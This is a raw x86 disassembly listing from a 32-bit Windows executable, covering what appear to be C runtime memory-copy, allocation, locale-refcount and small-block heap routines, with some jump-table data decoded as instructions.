  42479b:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247a1:	mov    BYTE PTR [edi+0x3],al
  4247a4:	sub    esi,0x1
  4247a7:	shr    ecx,0x2
  4247aa:	sub    edi,0x1
  4247ad:	cmp    ecx,0x8
  4247b0:	jb     0x424764
  4247b2:	std    
  4247b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247b5:	cld    
  4247b6:	jmp    DWORD PTR [edx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    al,BYTE PTR [esi+0x3]
  4247c3:	and    edx,ecx
  4247c5:	mov    BYTE PTR [edi+0x3],al
  4247c8:	mov    al,BYTE PTR [esi+0x2]
  4247cb:	shr    ecx,0x2
  4247ce:	mov    BYTE PTR [edi+0x2],al
  4247d1:	sub    esi,0x2
  4247d4:	sub    edi,0x2
  4247d7:	cmp    ecx,0x8
  4247da:	jb     0x424764
  4247dc:	std    
  4247dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247df:	cld    
  4247e0:	jmp    DWORD PTR [edx*4+0x424888]
  4247e7:	nop
  4247e8:	mov    al,BYTE PTR [esi+0x3]
  4247eb:	and    edx,ecx
  4247ed:	mov    BYTE PTR [edi+0x3],al
  4247f0:	mov    al,BYTE PTR [esi+0x2]
  4247f3:	mov    BYTE PTR [edi+0x2],al
  4247f6:	mov    al,BYTE PTR [esi+0x1]
  4247f9:	shr    ecx,0x2
  4247fc:	mov    BYTE PTR [edi+0x1],al
  4247ff:	sub    esi,0x3
  424802:	sub    edi,0x3
  424805:	cmp    ecx,0x8
  424808:	jb     0x424764
  42480e:	std    
  42480f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424811:	cld    
  424812:	jmp    DWORD PTR [edx*4+0x424888]
  424819:	lea    ecx,[ecx+0x0]
  42481c:	cmp    al,0x48
  42481e:	inc    edx
  42481f:	add    BYTE PTR [eax+ecx*2+0x42],al
  424823:	add    BYTE PTR [eax+ecx*2+0x42],cl
  424827:	add    BYTE PTR [eax+ecx*2+0x42],dl
  42482b:	add    BYTE PTR [eax+ecx*2+0x42],bl
  42482f:	add    BYTE PTR [eax+ecx*2+0x42],ah
  424833:	add    BYTE PTR [eax+ecx*2+0x42],ch
  424837:	add    BYTE PTR [edi+0x48],bh
  42483a:	inc    edx
  42483b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424841:	inc    esp
  424842:	(bad)  
  424843:	sbb    al,0x8b
  424845:	inc    esp
  424846:	mov    ds,WORD PTR [eax]
  424848:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42484c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  424850:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  424854:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  424858:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42485c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  424860:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  424864:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  424868:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42486c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  424870:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  424874:	lea    eax,[ecx*4+0x0]
  42487b:	add    esi,eax
  42487d:	add    edi,eax
  42487f:	jmp    DWORD PTR [edx*4+0x424888]
  424886:	mov    edi,edi
  424888:	cwde   
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [eax-0x4fffbdb8],ah
  424891:	dec    eax
  424892:	inc    edx
  424893:	add    ah,al
  424895:	dec    eax
  424896:	inc    edx
  424897:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42489d:	leave  
  42489e:	ret    
  42489f:	nop
  4248a0:	mov    al,BYTE PTR [esi+0x3]
  4248a3:	mov    BYTE PTR [edi+0x3],al
  4248a6:	mov    eax,DWORD PTR [ebp+0x8]
  4248a9:	pop    esi
  4248aa:	pop    edi
  4248ab:	leave  
  4248ac:	ret    
  4248ad:	lea    ecx,[ecx+0x0]
  4248b0:	mov    al,BYTE PTR [esi+0x3]
  4248b3:	mov    BYTE PTR [edi+0x3],al
  4248b6:	mov    al,BYTE PTR [esi+0x2]
  4248b9:	mov    BYTE PTR [edi+0x2],al
  4248bc:	mov    eax,DWORD PTR [ebp+0x8]
  4248bf:	pop    esi
  4248c0:	pop    edi
  4248c1:	leave  
  4248c2:	ret    
  4248c3:	nop
  4248c4:	mov    al,BYTE PTR [esi+0x3]
  4248c7:	mov    BYTE PTR [edi+0x3],al
  4248ca:	mov    al,BYTE PTR [esi+0x2]
  4248cd:	mov    BYTE PTR [edi+0x2],al
  4248d0:	mov    al,BYTE PTR [esi+0x1]
  4248d3:	mov    BYTE PTR [edi+0x1],al
  4248d6:	mov    eax,DWORD PTR [ebp+0x8]
  4248d9:	pop    esi
  4248da:	pop    edi
  4248db:	leave  
  4248dc:	ret    
  4248dd:	push   DWORD PTR [esp+0x4]
  4248e1:	call   DWORD PTR ds:0x4280a8
  4248e7:	xor    eax,eax
  4248e9:	inc    eax
  4248ea:	ret    0x8
  4248ed:	push   0x10
  4248ef:	push   0x4285b8
  4248f4:	call   0x423858
  4248f9:	mov    eax,ds:0x45cd88
  4248fe:	test   eax,eax
  424900:	jne    0x424939
  424902:	cmp    DWORD PTR ds:0x45cac4,0x1
  424909:	je     0x42492f
  42490b:	push   0x4285a4
  424910:	call   DWORD PTR ds:0x428014
  424916:	test   eax,eax
  424918:	je     0x42492f
  42491a:	push   0x42857c
  42491f:	push   eax
  424920:	call   DWORD PTR ds:0x428018
  424926:	mov    ds:0x45cd88,eax
  42492b:	test   eax,eax
  42492d:	jne    0x424939
  42492f:	mov    eax,0x4248dd
  424934:	mov    ds:0x45cd88,eax
  424939:	and    DWORD PTR [ebp-0x4],0x0
  42493d:	push   DWORD PTR [ebp+0xc]
  424940:	push   DWORD PTR [ebp+0x8]
  424943:	call   eax
  424945:	mov    DWORD PTR [ebp-0x1c],eax
  424948:	jmp    0x42496e
  42494a:	mov    eax,DWORD PTR [ebp-0x14]
  42494d:	mov    eax,DWORD PTR [eax]
  42494f:	mov    eax,DWORD PTR [eax]
  424951:	mov    DWORD PTR [ebp-0x20],eax
  424954:	xor    eax,eax
  424956:	inc    eax
  424957:	ret    
  424958:	mov    esp,DWORD PTR [ebp-0x18]
  42495b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  424962:	jne    0x42496c
  424964:	push   0x8
  424966:	call   DWORD PTR ds:0x428068
  42496c:	xor    eax,eax
  42496e:	or     DWORD PTR [ebp-0x4],0xffffffff
  424972:	call   0x423893
  424977:	ret    
  424978:	push   0x10
  42497a:	push   0x4285c8
  42497f:	call   0x423858
  424984:	mov    esi,DWORD PTR [ebp+0x8]
  424987:	imul   esi,DWORD PTR [ebp+0xc]
  42498b:	mov    DWORD PTR [ebp-0x1c],esi
  42498e:	test   esi,esi
  424990:	jne    0x424993
  424992:	inc    esi
  424993:	xor    edi,edi
  424995:	mov    DWORD PTR [ebp-0x20],edi
  424998:	cmp    esi,0xffffffe0
  42499b:	ja     0x424a02
  42499d:	cmp    DWORD PTR ds:0x45d144,0x3
  4249a4:	jne    0x4249ed
  4249a6:	add    esi,0xf
  4249a9:	and    esi,0xfffffff0
  4249ac:	mov    DWORD PTR [ebp+0xc],esi
  4249af:	mov    ebx,DWORD PTR [ebp-0x1c]
  4249b2:	cmp    ebx,DWORD PTR ds:0x45cf04
  4249b8:	ja     0x4249ed
  4249ba:	push   0x4
  4249bc:	call   0x423a1f
  4249c1:	pop    ecx
  4249c2:	and    DWORD PTR [ebp-0x4],edi
  4249c5:	push   ebx
  4249c6:	call   0x425421
  4249cb:	pop    ecx
  4249cc:	mov    DWORD PTR [ebp-0x20],eax
  4249cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249d3:	call   0x424a22
  4249d8:	mov    edi,DWORD PTR [ebp-0x20]
  4249db:	test   edi,edi
  4249dd:	je     0x4249f1
  4249df:	push   DWORD PTR [ebp-0x1c]
  4249e2:	push   0x0
  4249e4:	push   edi
  4249e5:	call   0x426160
  4249ea:	add    esp,0xc
  4249ed:	test   edi,edi
  4249ef:	jne    0x424a2b
  4249f1:	push   esi
  4249f2:	push   0x8
  4249f4:	push   DWORD PTR ds:0x45d140
  4249fa:	call   DWORD PTR ds:0x4280a4
  424a00:	mov    edi,eax
  424a02:	test   edi,edi
  424a04:	jne    0x424a2b
  424a06:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a0c:	je     0x424a2b
  424a0e:	push   esi
  424a0f:	call   0x426142
  424a14:	pop    ecx
  424a15:	test   eax,eax
  424a17:	jne    0x424993
  424a1d:	jmp    0x424a2d
  424a1f:	mov    esi,DWORD PTR [ebp+0xc]
  424a22:	push   0x4
  424a24:	call   0x42398b
  424a29:	pop    ecx
  424a2a:	ret    
  424a2b:	mov    eax,edi
  424a2d:	call   0x423893
  424a32:	ret    
  424a33:	push   esi
  424a34:	mov    esi,DWORD PTR [esp+0x8]
  424a38:	mov    eax,DWORD PTR [esi+0x3c]
  424a3b:	push   edi
  424a3c:	xor    edi,edi
  424a3e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a44:	je     0x424aa9
  424a46:	cmp    eax,edi
  424a48:	je     0x424aa9
  424a4a:	mov    eax,DWORD PTR [esi+0x2c]
  424a4d:	cmp    DWORD PTR [eax],edi
  424a4f:	jne    0x424aa9
  424a51:	mov    eax,DWORD PTR [esi+0x34]
  424a54:	cmp    eax,edi
  424a56:	je     0x424a74
  424a58:	cmp    DWORD PTR [eax],edi
  424a5a:	jne    0x424a74
  424a5c:	cmp    eax,DWORD PTR ds:0x45cef0
  424a62:	je     0x424a74
  424a64:	push   eax
  424a65:	call   0x42446a
  424a6a:	push   DWORD PTR [esi+0x3c]
  424a6d:	call   0x4263af
  424a72:	pop    ecx
  424a73:	pop    ecx
  424a74:	mov    eax,DWORD PTR [esi+0x30]
  424a77:	cmp    eax,edi
  424a79:	je     0x424a97
  424a7b:	cmp    DWORD PTR [eax],edi
  424a7d:	jne    0x424a97
  424a7f:	cmp    eax,DWORD PTR ds:0x45cef4
  424a85:	je     0x424a97
  424a87:	push   eax
  424a88:	call   0x42446a
  424a8d:	push   DWORD PTR [esi+0x3c]
  424a90:	call   0x426350
  424a95:	pop    ecx
  424a96:	pop    ecx
  424a97:	push   DWORD PTR [esi+0x2c]
  424a9a:	call   0x42446a
  424a9f:	push   DWORD PTR [esi+0x3c]
  424aa2:	call   0x42446a
  424aa7:	pop    ecx
  424aa8:	pop    ecx
  424aa9:	mov    eax,DWORD PTR [esi+0x40]
  424aac:	cmp    eax,DWORD PTR ds:0x45ceec
  424ab2:	je     0x424acc
  424ab4:	cmp    eax,edi
  424ab6:	je     0x424acc
  424ab8:	cmp    DWORD PTR [eax],edi
  424aba:	jne    0x424acc
  424abc:	push   eax
  424abd:	call   0x42446a
  424ac2:	push   DWORD PTR [esi+0x44]
  424ac5:	call   0x42446a
  424aca:	pop    ecx
  424acb:	pop    ecx
  424acc:	mov    eax,DWORD PTR [esi+0x50]
  424acf:	cmp    eax,DWORD PTR ds:0x45cdd0
  424ad5:	je     0x424af3
  424ad7:	cmp    eax,edi
  424ad9:	je     0x424af3
  424adb:	cmp    DWORD PTR [eax+0xb4],edi
  424ae1:	jne    0x424af3
  424ae3:	push   eax
  424ae4:	call   0x4261c0
  424ae9:	push   DWORD PTR [esi+0x50]
  424aec:	call   0x42446a
  424af1:	pop    ecx
  424af2:	pop    ecx
  424af3:	push   esi
  424af4:	call   0x42446a
  424af9:	pop    ecx
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	ret    
  424afd:	push   esi
  424afe:	call   0x42370d
  424b03:	mov    esi,eax
  424b05:	mov    eax,DWORD PTR [esi+0x64]
  424b08:	cmp    eax,DWORD PTR ds:0x45c58c
  424b0e:	je     0x424bba
  424b14:	test   eax,eax
  424b16:	je     0x424b47
  424b18:	mov    ecx,DWORD PTR [eax+0x2c]
  424b1b:	dec    DWORD PTR [eax]
  424b1d:	test   ecx,ecx
  424b1f:	je     0x424b23
  424b21:	dec    DWORD PTR [ecx]
  424b23:	mov    ecx,DWORD PTR [eax+0x34]
  424b26:	test   ecx,ecx
  424b28:	je     0x424b2c
  424b2a:	dec    DWORD PTR [ecx]
  424b2c:	mov    ecx,DWORD PTR [eax+0x30]
  424b2f:	test   ecx,ecx
  424b31:	je     0x424b35
  424b33:	dec    DWORD PTR [ecx]
  424b35:	mov    ecx,DWORD PTR [eax+0x40]
  424b38:	test   ecx,ecx
  424b3a:	je     0x424b3e
  424b3c:	dec    DWORD PTR [ecx]
  424b3e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b41:	dec    DWORD PTR [ecx+0xb4]
  424b47:	mov    ecx,DWORD PTR ds:0x45c58c
  424b4d:	mov    DWORD PTR [esi+0x64],ecx
  424b50:	mov    ecx,DWORD PTR ds:0x45c58c
  424b56:	inc    DWORD PTR [ecx]
  424b58:	mov    ecx,DWORD PTR ds:0x45c58c
  424b5e:	mov    ecx,DWORD PTR [ecx+0x2c]
  424b61:	test   ecx,ecx
  424b63:	je     0x424b67
  424b65:	inc    DWORD PTR [ecx]
  424b67:	mov    ecx,DWORD PTR ds:0x45c58c
  424b6d:	mov    ecx,DWORD PTR [ecx+0x34]
  424b70:	test   ecx,ecx
  424b72:	je     0x424b76
  424b74:	inc    DWORD PTR [ecx]
  424b76:	mov    ecx,DWORD PTR ds:0x45c58c
  424b7c:	mov    ecx,DWORD PTR [ecx+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	inc    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR ds:0x45c58c
  424b8b:	mov    ecx,DWORD PTR [ecx+0x40]
  424b8e:	test   ecx,ecx
  424b90:	je     0x424b94
  424b92:	inc    DWORD PTR [ecx]
  424b94:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9a:	mov    ecx,DWORD PTR [ecx+0x4c]
  424b9d:	inc    DWORD PTR [ecx+0xb4]
  424ba3:	test   eax,eax
  424ba5:	je     0x424bba
  424ba7:	cmp    DWORD PTR [eax],0x0
  424baa:	jne    0x424bba
  424bac:	cmp    eax,0x45c538
  424bb1:	je     0x424bba
  424bb3:	push   eax
  424bb4:	call   0x424a33
  424bb9:	pop    ecx
  424bba:	mov    eax,DWORD PTR [esi+0x64]
  424bbd:	pop    esi
  424bbe:	ret    
  424bbf:	push   0xc
  424bc1:	push   0x428758
  424bc6:	call   0x423858
  424bcb:	push   0xc
  424bcd:	call   0x423a1f
  424bd2:	pop    ecx
  424bd3:	and    DWORD PTR [ebp-0x4],0x0
  424bd7:	call   0x424afd
  424bdc:	mov    DWORD PTR [ebp-0x1c],eax
  424bdf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424be3:	call   0x424bf1
  424be8:	mov    eax,DWORD PTR [ebp-0x1c]
  424beb:	call   0x423893
  424bf0:	ret    
  424bf1:	push   0xc
  424bf3:	call   0x42398b
  424bf8:	pop    ecx
  424bf9:	ret    
  424bfa:	push   0x140
  424bff:	push   0x0
  424c01:	push   DWORD PTR ds:0x45d140
  424c07:	call   DWORD PTR ds:0x4280a4
  424c0d:	test   eax,eax
  424c0f:	mov    ds:0x45cf00,eax
  424c14:	jne    0x424c17
  424c16:	ret    
  424c17:	mov    ecx,DWORD PTR [esp+0x4]
  424c1b:	and    DWORD PTR ds:0x45cef8,0x0
  424c22:	and    DWORD PTR ds:0x45cefc,0x0
  424c29:	mov    ds:0x45cf08,eax
  424c2e:	xor    eax,eax
  424c30:	mov    DWORD PTR ds:0x45cf04,ecx
  424c36:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c40:	inc    eax
  424c41:	ret    
  424c42:	mov    eax,ds:0x45cefc
  424c47:	lea    ecx,[eax+eax*4]
  424c4a:	mov    eax,ds:0x45cf00
  424c4f:	lea    ecx,[eax+ecx*4]
  424c52:	jmp    0x424c66
  424c54:	mov    edx,DWORD PTR [esp+0x4]
  424c58:	sub    edx,DWORD PTR [eax+0xc]
  424c5b:	cmp    edx,0x100000
  424c61:	jb     0x424c6c
  424c63:	add    eax,0x14
  424c66:	cmp    eax,ecx
  424c68:	jb     0x424c54
  424c6a:	xor    eax,eax
  424c6c:	ret    
  424c6d:	push   ebp
  424c6e:	mov    ebp,esp
  424c70:	sub    esp,0x10
  424c73:	mov    ecx,DWORD PTR [ebp+0x8]
  424c76:	mov    eax,DWORD PTR [ecx+0x10]
  424c79:	push   esi
  424c7a:	mov    esi,DWORD PTR [ebp+0xc]
  424c7d:	push   edi
  424c7e:	mov    edi,esi
  424c80:	sub    edi,DWORD PTR [ecx+0xc]
  424c83:	add    esi,0xfffffffc
  424c86:	shr    edi,0xf
  424c89:	mov    ecx,edi
  424c8b:	imul   ecx,ecx,0x204
  424c91:	lea    ecx,[ecx+eax*1+0x144]
  424c98:	mov    DWORD PTR [ebp-0x10],ecx
  424c9b:	mov    ecx,DWORD PTR [esi]
  424c9d:	dec    ecx
  424c9e:	test   cl,0x1
  424ca1:	mov    DWORD PTR [ebp-0x4],ecx
  424ca4:	jne    0x424f81
  424caa:	push   ebx
  424cab:	lea    ebx,[ecx+esi*1]
  424cae:	mov    edx,DWORD PTR [ebx]
  424cb0:	mov    DWORD PTR [ebp-0xc],edx
  424cb3:	mov    edx,DWORD PTR [esi-0x4]
  424cb6:	mov    DWORD PTR [ebp-0x8],edx
  424cb9:	mov    edx,DWORD PTR [ebp-0xc]
  424cbc:	test   dl,0x1
  424cbf:	mov    DWORD PTR [ebp+0xc],ebx
  424cc2:	jne    0x424d38
  424cc4:	sar    edx,0x4
  424cc7:	dec    edx
  424cc8:	cmp    edx,0x3f
  424ccb:	jbe    0x424cd0
  424ccd:	push   0x3f
  424ccf:	pop    edx
  424cd0:	mov    ecx,DWORD PTR [ebx+0x4]
  424cd3:	cmp    ecx,DWORD PTR [ebx+0x8]
  424cd6:	jne    0x424d1a
  424cd8:	cmp    edx,0x20
  424cdb:	mov    ebx,0x80000000
  424ce0:	jae    0x424cfb
  424ce2:	mov    ecx,edx
  424ce4:	shr    ebx,cl
  424ce6:	lea    ecx,[edx+eax*1+0x4]
  424cea:	not    ebx
  424cec:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424cf0:	dec    BYTE PTR [ecx]
  424cf2:	jne    0x424d17
  424cf4:	mov    ecx,DWORD PTR [ebp+0x8]
  424cf7:	and    DWORD PTR [ecx],ebx
  424cf9:	jmp    0x424d17
  424cfb:	lea    ecx,[edx-0x20]
  424cfe:	shr    ebx,cl
  424d00:	lea    ecx,[edx+eax*1+0x4]
  424d04:	not    ebx
  424d06:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d0d:	dec    BYTE PTR [ecx]
  424d0f:	jne    0x424d17
  424d11:	mov    ecx,DWORD PTR [ebp+0x8]
  424d14:	and    DWORD PTR [ecx+0x4],ebx
  424d17:	mov    ebx,DWORD PTR [ebp+0xc]
  424d1a:	mov    edx,DWORD PTR [ebx+0x8]
  424d1d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d20:	mov    ecx,DWORD PTR [ebp-0x4]
  424d23:	add    ecx,DWORD PTR [ebp-0xc]
  424d26:	mov    DWORD PTR [edx+0x4],ebx
  424d29:	mov    edx,DWORD PTR [ebp+0xc]
  424d2c:	mov    ebx,DWORD PTR [edx+0x4]
  424d2f:	mov    edx,DWORD PTR [edx+0x8]
  424d32:	mov    DWORD PTR [ebx+0x8],edx
  424d35:	mov    DWORD PTR [ebp-0x4],ecx
  424d38:	mov    edx,ecx
  424d3a:	sar    edx,0x4
  424d3d:	dec    edx
  424d3e:	cmp    edx,0x3f
  424d41:	jbe    0x424d46
  424d43:	push   0x3f
  424d45:	pop    edx
  424d46:	mov    ebx,DWORD PTR [ebp-0x8]
  424d49:	and    ebx,0x1
  424d4c:	mov    DWORD PTR [ebp-0xc],ebx
  424d4f:	jne    0x424de4
  424d55:	sub    esi,DWORD PTR [ebp-0x8]
  424d58:	mov    ebx,DWORD PTR [ebp-0x8]
  424d5b:	sar    ebx,0x4
  424d5e:	push   0x3f
  424d60:	mov    DWORD PTR [ebp+0xc],esi
  424d63:	dec    ebx
  424d64:	pop    esi
  424d65:	cmp    ebx,esi
  424d67:	jbe    0x424d6b
  424d69:	mov    ebx,esi
  424d6b:	add    ecx,DWORD PTR [ebp-0x8]
  424d6e:	mov    edx,ecx
  424d70:	sar    edx,0x4
  424d73:	dec    edx
  424d74:	cmp    edx,esi
  424d76:	mov    DWORD PTR [ebp-0x4],ecx
  424d79:	jbe    0x424d7d
  424d7b:	mov    edx,esi
  424d7d:	cmp    ebx,edx
  424d7f:	je     0x424ddf
  424d81:	mov    ecx,DWORD PTR [ebp+0xc]
  424d84:	mov    esi,DWORD PTR [ecx+0x4]
  424d87:	cmp    esi,DWORD PTR [ecx+0x8]
  424d8a:	jne    0x424dc7
  424d8c:	cmp    ebx,0x20
  424d8f:	mov    esi,0x80000000
  424d94:	jae    0x424dad
  424d96:	mov    ecx,ebx
  424d98:	shr    esi,cl
  424d9a:	not    esi
  424d9c:	and    DWORD PTR [eax+edi*4+0x44],esi
  424da0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424da4:	jne    0x424dc7
  424da6:	mov    ecx,DWORD PTR [ebp+0x8]
  424da9:	and    DWORD PTR [ecx],esi
  424dab:	jmp    0x424dc7
  424dad:	lea    ecx,[ebx-0x20]
  424db0:	shr    esi,cl
  424db2:	not    esi
  424db4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424dbb:	dec    BYTE PTR [ebx+eax*1+0x4]
  424dbf:	jne    0x424dc7
  424dc1:	mov    ecx,DWORD PTR [ebp+0x8]
  424dc4:	and    DWORD PTR [ecx+0x4],esi
  424dc7:	mov    ecx,DWORD PTR [ebp+0xc]
  424dca:	mov    esi,DWORD PTR [ecx+0x8]
  424dcd:	mov    ecx,DWORD PTR [ecx+0x4]
  424dd0:	mov    DWORD PTR [esi+0x4],ecx
  424dd3:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd6:	mov    esi,DWORD PTR [ecx+0x4]
  424dd9:	mov    ecx,DWORD PTR [ecx+0x8]
  424ddc:	mov    DWORD PTR [esi+0x8],ecx
  424ddf:	mov    esi,DWORD PTR [ebp+0xc]
  424de2:	jmp    0x424de7
  424de4:	mov    ebx,DWORD PTR [ebp+0x8]
  424de7:	cmp    DWORD PTR [ebp-0xc],0x0
  424deb:	jne    0x424df5
  424ded:	cmp    ebx,edx
  424def:	je     0x424e75
  424df5:	mov    ecx,DWORD PTR [ebp-0x10]
  424df8:	lea    ecx,[ecx+edx*8]
  424dfb:	mov    ebx,DWORD PTR [ecx+0x4]
  424dfe:	mov    DWORD PTR [esi+0x8],ecx
  424e01:	mov    DWORD PTR [esi+0x4],ebx
  424e04:	mov    DWORD PTR [ecx+0x4],esi
  424e07:	mov    ecx,DWORD PTR [esi+0x4]
  424e0a:	mov    DWORD PTR [ecx+0x8],esi
  424e0d:	mov    ecx,DWORD PTR [esi+0x4]
  424e10:	cmp    ecx,DWORD PTR [esi+0x8]
  424e13:	jne    0x424e75
  424e15:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e19:	mov    BYTE PTR [ebp+0xf],cl
  424e1c:	inc    cl
  424e1e:	cmp    edx,0x20
  424e21:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e25:	jae    0x424e4c
  424e27:	cmp    BYTE PTR [ebp+0xf],0x0
  424e2b:	jne    0x424e3b
  424e2d:	mov    ecx,edx
  424e2f:	mov    ebx,0x80000000
  424e34:	shr    ebx,cl
  424e36:	mov    ecx,DWORD PTR [ebp+0x8]
  424e39:	or     DWORD PTR [ecx],ebx
  424e3b:	mov    ebx,0x80000000
  424e40:	mov    ecx,edx
  424e42:	shr    ebx,cl
  424e44:	lea    eax,[eax+edi*4+0x44]
  424e48:	or     DWORD PTR [eax],ebx
  424e4a:	jmp    0x424e75
  424e4c:	cmp    BYTE PTR [ebp+0xf],0x0
  424e50:	jne    0x424e62
  424e52:	lea    ecx,[edx-0x20]
  424e55:	mov    ebx,0x80000000
  424e5a:	shr    ebx,cl
  424e5c:	mov    ecx,DWORD PTR [ebp+0x8]
  424e5f:	or     DWORD PTR [ecx+0x4],ebx
  424e62:	lea    ecx,[edx-0x20]
  424e65:	mov    edx,0x80000000
  424e6a:	shr    edx,cl
  424e6c:	lea    eax,[eax+edi*4+0xc4]
  424e73:	or     DWORD PTR [eax],edx
  424e75:	mov    eax,DWORD PTR [ebp-0x4]
  424e78:	mov    DWORD PTR [esi],eax
  424e7a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424e7e:	mov    eax,DWORD PTR [ebp-0x10]
  424e81:	dec    DWORD PTR [eax]
  424e83:	jne    0x424f80
  424e89:	mov    eax,ds:0x45cef8
  424e8e:	test   eax,eax
  424e90:	je     0x424f72
  424e96:	mov    ecx,DWORD PTR ds:0x45cf10
  424e9c:	mov    esi,DWORD PTR ds:0x428084
  424ea2:	push   0x4000
  424ea7:	shl    ecx,0xf
  424eaa:	add    ecx,DWORD PTR [eax+0xc]
  424ead:	mov    ebx,0x8000
  424eb2:	push   ebx
  424eb3:	push   ecx
  424eb4:	call   esi
  424eb6:	mov    ecx,DWORD PTR ds:0x45cf10
  424ebc:	mov    eax,ds:0x45cef8
  424ec1:	mov    edx,0x80000000
  424ec6:	shr    edx,cl
  424ec8:	or     DWORD PTR [eax+0x8],edx
  424ecb:	mov    eax,ds:0x45cef8
  424ed0:	mov    eax,DWORD PTR [eax+0x10]
  424ed3:	mov    ecx,DWORD PTR ds:0x45cf10
  424ed9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424ee1:	mov    eax,ds:0x45cef8
  424ee6:	mov    eax,DWORD PTR [eax+0x10]
  424ee9:	dec    BYTE PTR [eax+0x43]
  424eec:	mov    eax,ds:0x45cef8
  424ef1:	mov    ecx,DWORD PTR [eax+0x10]
  424ef4:	cmp    BYTE PTR [ecx+0x43],0x0
  424ef8:	jne    0x424f03
  424efa:	and    DWORD PTR [eax+0x4],0xfffffffe
  424efe:	mov    eax,ds:0x45cef8
  424f03:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f07:	jne    0x424f72
  424f09:	push   ebx
  424f0a:	push   0x0
  424f0c:	push   DWORD PTR [eax+0xc]
  424f0f:	call   esi
  424f11:	mov    eax,ds:0x45cef8
  424f16:	push   DWORD PTR [eax+0x10]
  424f19:	push   0x0
  424f1b:	push   DWORD PTR ds:0x45d140
  424f21:	call   DWORD PTR ds:0x428088
  424f27:	mov    eax,ds:0x45cefc
  424f2c:	mov    edx,DWORD PTR ds:0x45cf00
  424f32:	lea    eax,[eax+eax*4]
  424f35:	shl    eax,0x2
  424f38:	mov    ecx,eax
  424f3a:	mov    eax,ds:0x45cef8
  424f3f:	sub    ecx,eax
  424f41:	lea    ecx,[ecx+edx*1-0x14]
  424f45:	push   ecx
  424f46:	lea    ecx,[eax+0x14]
  424f49:	push   ecx
  424f4a:	push   eax
  424f4b:	call   0x4267a0
  424f50:	mov    eax,DWORD PTR [ebp+0x8]
  424f53:	add    esp,0xc
  424f56:	dec    DWORD PTR ds:0x45cefc
  424f5c:	cmp    eax,DWORD PTR ds:0x45cef8
  424f62:	jbe    0x424f68
  424f64:	sub    DWORD PTR [ebp+0x8],0x14
  424f68:	mov    eax,ds:0x45cf00
  424f6d:	mov    ds:0x45cf08,eax
  424f72:	mov    eax,DWORD PTR [ebp+0x8]
  424f75:	mov    ds:0x45cef8,eax
  424f7a:	mov    DWORD PTR ds:0x45cf10,edi
  424f80:	pop    ebx
  424f81:	pop    edi
  424f82:	pop    esi
  424f83:	leave  
  424f84:	ret    
  424f85:	mov    eax,ds:0x45cefc
  424f8a:	mov    ecx,DWORD PTR ds:0x45cf0c
  424f90:	push   edi
  424f91:	xor    edi,edi
  424f93:	cmp    eax,ecx
  424f95:	jne    0x424fcb
  424f97:	lea    eax,[ecx+ecx*4+0x50]
  424f9b:	shl    eax,0x2
  424f9e:	push   eax
  424f9f:	push   DWORD PTR ds:0x45cf00
  424fa5:	push   edi
  424fa6:	push   DWORD PTR ds:0x45d140
  424fac:	call   DWORD PTR ds:0x4280b0
  424fb2:	cmp    eax,edi
  424fb4:	jne    0x424fba
  424fb6:	xor    eax,eax
  424fb8:	pop    edi
  424fb9:	ret    
  424fba:	add    DWORD PTR ds:0x45cf0c,0x10
  424fc1:	mov    ds:0x45cf00,eax
  424fc6:	mov    eax,ds:0x45cefc
  424fcb:	mov    ecx,DWORD PTR ds:0x45cf00
  424fd1:	push   esi
  424fd2:	push   0x41c4
  424fd7:	push   0x8
  424fd9:	push   DWORD PTR ds:0x45d140
  424fdf:	lea    eax,[eax+eax*4]
  424fe2:	lea    esi,[ecx+eax*4]
  424fe5:	call   DWORD PTR ds:0x4280a4
  424feb:	cmp    eax,edi
  424fed:	mov    DWORD PTR [esi+0x10],eax
  424ff0:	jne    0x424ff6
  424ff2:	xor    eax,eax
  424ff4:	jmp    0x425039
  424ff6:	push   0x4
  424ff8:	push   0x2000
  424ffd:	push   0x100000
  425002:	push   edi
  425003:	call   DWORD PTR ds:0x4280ac
  425009:	cmp    eax,edi
  42500b:	mov    DWORD PTR [esi+0xc],eax
  42500e:	jne    0x425022
  425010:	push   DWORD PTR [esi+0x10]
  425013:	push   edi
  425014:	push   DWORD PTR ds:0x45d140
  42501a:	call   DWORD PTR ds:0x428088
  425020:	jmp    0x424ff2
  425022:	or     DWORD PTR [esi+0x8],0xffffffff
